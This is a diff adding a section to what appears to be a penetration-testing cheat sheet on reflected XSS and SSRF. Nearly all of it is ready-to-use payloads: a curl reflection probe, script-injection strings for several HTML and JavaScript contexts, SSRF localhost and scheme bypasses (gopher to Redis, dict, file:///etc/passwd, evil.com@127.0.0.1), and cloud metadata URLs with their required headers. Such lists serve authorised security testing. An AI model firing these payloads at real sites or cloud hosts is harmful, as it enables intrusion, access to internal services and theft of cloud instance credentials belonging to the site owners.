@@ -398,3 +398,35 @@ curl -sk -o /dev/null -w "%{http_code}\n" -H 'X-Original-URL: /admin' 'https://t
   tool-gateway) — frequently cluster-internal only; test from each vantage.
 - SSRF via workflow HTTP-request nodes / webhook responders → internal services
   and cloud metadata. Confirm out-of-band (interactsh).
+
+---
+
+## Reflected-XSS reflection matrix & SSRF bypasses (2020–2026) — v4.7
+
+> `--xss` automates the reflection matrix below; SSRF exploitation stays manual.
+> All unauthenticated. Confirm XSS execution in a real browser.
+
+### XSS: canary + special-char reflection matrix (what `--xss` does)
+```bash
+# inject a unique canary + metachars, see which survive UNESCAPED and in what context
+curl -s "https://target/?q=xsrCANARY<>\"'(){};=/" | grep -o 'xsrCANARY..............'
+# if < and > come back raw -> tag injection; confirm:
+#   https://target/?q=<svg/onload=alert(1)>
+# attribute context (quote survives):  "><img src=x onerror=alert(1)>
+# javascript context (inside <script>): ';alert(1);//
+```
+
+### SSRF: localhost / scheme bypass payloads (feed to a known SSRF param + OOB)
+```text
+http://127.1            http://2130706433          http://0x7f.0x0.0x0.0x1
+http://[::1]            http://[::ffff:127.0.0.1]  http://127.0.0.1.nip.io
+http://evil.com@127.0.0.1    http://localhost#@evil.com
+gopher://127.0.0.1:6379/_    dict://127.0.0.1:11211/   file:///etc/passwd
+```
+Cloud metadata (add the required header):
+```text
+AWS   http://169.254.169.254/latest/meta-data/      (+ IMDSv6: http://[fd00:ec2::254])
+GCP   http://metadata.google.internal/computeMetadata/v1/   -H 'Metadata-Flavor: Google'
+Azure http://169.254.169.254/metadata/instance?api-version=2021-02-01  -H 'Metadata: true'
+Alibaba http://100.100.100.200/latest/meta-data/    Oracle http://169.254.169.254/opc/v2/instance/
+```
